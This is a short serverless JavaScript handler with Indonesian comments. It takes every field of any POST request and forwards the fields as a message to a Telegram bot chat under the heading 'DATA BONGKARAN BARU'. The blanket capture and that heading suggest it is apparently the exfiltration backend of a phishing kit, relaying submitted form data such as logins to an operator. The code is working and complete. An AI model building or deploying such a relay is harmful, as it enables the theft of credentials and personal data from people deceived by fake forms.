export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method Not Allowed" });
  }

  // Ambil token dari env
  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  // Cek apakah env sudah terisi
  if (!TOKEN || !CHAT_ID) {
    return res.status(500).json({ 
      status: "error", 
      message: "Server environment variables are missing (TOKEN/CHAT_ID)" 
    });
  }

  try {
    const data = req.body;
    let text = "📥 *DATA BONGKARAN BARU*\n\n";

    for (const k in data) {
      // Abaikan jika datanya kosong atau berupa object file kosong {}
      if (!data[k] || (typeof data[k] === 'object' && Object.keys(data[k]).length === 0)) {
        continue;
      }
      
      const label = k.toUpperCase().replace(/_/g, " ");
      text += `*${label}* : \`${data[k]}\` \n`;
    }

    const telegramURL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    const tgRes = await fetch(telegramURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: "Markdown"
      })
    });

    const result = await tgRes.json();

    if (result.ok) {
      return res.status(200).json({ status: "success" });
    } else {
      console.error("Telegram API Error:", result);
      return res.status(500).json({ status: "error", message: result.description });
    }

  } catch (err) {
    console.error("Runtime Error:", err);
    return res.status(500).json({ status: "error", message: "Internal server error" });
  }
}
